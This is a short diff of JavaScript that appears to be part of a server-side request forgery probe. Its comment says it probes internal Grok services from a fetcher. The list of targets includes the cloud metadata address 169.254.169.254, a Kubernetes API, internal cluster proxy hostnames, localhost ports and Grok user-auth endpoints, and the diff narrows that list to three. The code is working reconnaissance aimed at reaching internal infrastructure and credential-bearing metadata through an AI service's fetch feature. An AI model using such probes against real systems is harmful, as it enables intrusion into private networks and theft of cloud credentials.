@@ -43,15 +43,9 @@ if(Array.isArray(m)){
 
   // Probe internal Grok services and APIs from the fetcher
   const probes=[
-    ["GROK_API","https://grok.com/rest/app-chat/conversations"],
-    ["GROK_USER","https://grok.com/rest/auth/get-user"],
-    ["FILES","https://files.grok.com/"],
-    ["HADES_CG","http://coingecko-proxy.hades-openbar.svc.cluster.local/api/v3/ping"],
-    ["HADES_PG","http://polygon-proxy.hades-openbar.svc.cluster.local/"],
-    ["GCP_META","http://169.254.169.254/computeMetadata/v1/"],
-    ["K8S","https://kubernetes.default.svc/api"],
-    ["INTERNAL","http://localhost:8080/"],
-    ["INTERNAL2","http://127.0.0.1:3000/"],
+    ["GROK","https://grok.com/rest/auth/get-user"],
+    ["META","http://169.254.169.254/computeMetadata/v1/"],
+    ["HADES","http://coingecko-proxy.hades-openbar.svc.cluster.local/api/v3/ping"],
   ];
 
   Promise.allSettled(probes.map(([name,url])=>{
